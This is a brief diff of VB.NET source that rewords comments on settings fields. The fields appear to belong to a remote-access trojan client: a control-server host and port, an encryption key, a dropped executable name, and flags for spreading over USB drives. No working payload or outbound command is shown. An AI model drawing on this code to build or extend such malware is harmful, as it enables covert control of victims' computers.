@@ -9,9 +9,9 @@
         Public Shared HOST As String 'IP
         Public Shared PORT As Integer 'PORT
         Public Shared EncryptionKey As String = "NYANCAT" 'encryption/decryption key
-        Public Shared ENDOF As String = "|'N'|" 'socket key
-        Public Shared SPL As String = "|'L'|" 'split bytes
-        Public Shared EXE As String = "CLIENT.exe" 'client name
+        Public Shared ENDOF As String = "|'N'|" 'endof
+        Public Shared SPL As String = "|'L'|" 'split data
+        Public Shared EXE As String = "CLIENT.exe" 'client drop name
         Public Shared MTX As Threading.Mutex
         Public Shared USB As Boolean = False 'usb spread
         Public Shared PIN As Boolean = False 'pin spread
